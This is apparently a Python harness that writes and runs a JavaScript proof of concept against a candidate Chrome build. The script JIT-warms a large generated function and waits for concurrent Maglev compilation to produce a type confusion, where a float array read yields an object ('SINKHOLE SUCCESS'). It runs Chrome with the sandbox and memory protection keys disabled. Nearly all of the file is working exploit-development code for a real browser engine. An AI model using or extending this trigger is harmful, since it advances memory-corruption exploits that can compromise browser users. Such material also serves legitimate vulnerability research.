import subprocess, tempfile

html = """<!DOCTYPE html><html><body><script>
console.log("Defining function...");
let lines = [];
lines.push("function trigger(x, arr, obj) {");
for (let i = 0; i < 650; i++) lines.push(`  if (x === ${i}) return ${i};`);
lines.push(`
  arr[0] = obj;
  let res = null;
  while ((res = arr[1]) !== null) {
    break;
  }
  return res;
`);
lines.push("}");
lines.push("return trigger;");

let fn = new Function(lines.join("\\n"))();
let dummy = { a: 1 };

// Pre-create pool so no GC during warmup
let pool = [];
for (let i = 0; i < 20000; i++) {
  pool.push([1.1, 2.2, 3.3]);
}

console.log("Warming up...");
for (let i = 0; i < 20000; i++) {
  fn(i, pool[i], dummy);
}
console.log("Warmup done! Waiting 1s for concurrent Maglev...");

setTimeout(() => {
  console.log("Testing trigger after 1s delay...");
  let farr = [1.1, 2.2, 3.3];
  let res = fn(1000, farr, dummy);
  console.log("RESULT: type=" + (typeof res) + " val=" + res);
  if (typeof res === "object") {
    console.log("🔥🔥🔥 SINKHOLE SUCCESS! Object:", res, "🔥🔥🔥");
  } else {
    console.log("Still not object. Result:", res);
  }
}, 1000);
</script></body></html>"""

with open("script/test_async_maglev.html", "w") as f:
    f.write(html)

profile = tempfile.mkdtemp(prefix="prof-")
cmd = [
    "./script/candidate/chrome/chrome",
    "--headless=new",
    "--no-sandbox",
    "--disable-gpu",
    "--disable-dev-shm-usage",
    f"--user-data-dir={profile}",
    "--enable-logging=stderr",
    "--js-flags=--no-memory-protection-keys --expose-cage-base --trace-opt",
    "http://127.0.0.1:8000/test_async_maglev.html"
]
p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
try:
    out, _ = p.communicate(timeout=6)
except subprocess.TimeoutExpired:
    p.kill()
    out, _ = p.communicate()

for line in out.splitlines():
    if any(k in line for k in ["RESULT", "SUCCESS", "CONSOLE", "trigger", "compiling"]):
        print(line)
